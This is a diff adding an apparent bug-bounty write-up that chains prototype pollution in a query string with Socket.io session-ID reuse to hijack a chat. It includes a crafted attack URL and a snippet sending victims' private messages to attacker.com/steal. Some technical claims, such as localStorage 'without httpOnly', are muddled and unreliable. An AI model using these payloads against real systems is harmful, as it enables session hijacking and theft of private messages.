@@ -1,0 +1,45 @@
+The overlooked low bug
+
+    WebSocket session ID is stored in window.localStorage without httpOnly
+
+    engine.io (Socket.io) allows reusing sid across different user agents
+
+The chaining enabler
+
+    Prototype pollution via ?__proto__[polling]=true in query string
+
+    App uses Object.assign({}, userInput) somewhere
+
+Advanced chain
+Step 1 – Attacker crafts malicious link
+text
+
+https://target.com/chat?__proto__[sid]=attacker_sid&__proto__[polling]=true
+
+Step 2 – Victim clicks link → prototype polluted
+javascript
+
+// App code vulnerable line
+const options = Object.assign({}, location.query);
+socket = io({ query: options });
+
+Polluted prototype makes Socket.io accept attacker-controlled sid.
+Step 3 – Attacker listens on same WebSocket namespace
+javascript
+
+// Attacker's malicious page
+const socket = io('https://target.com/chat', {
+  query: { sid: 'attacker_generated_sid' }
+});
+
+// Victim's polluted sid = attacker_generated_sid
+// Now victim connects to attacker's session
+
+Step 4 – Victim's WebSocket messages go to attacker
+javascript
+
+socket.on('private_message', (msg) => {
+  fetch('https://attacker.com/steal?msg=' + msg);
+});
+
+Why P1: Full chat takeover, private messages, file uploads via WebSocket.
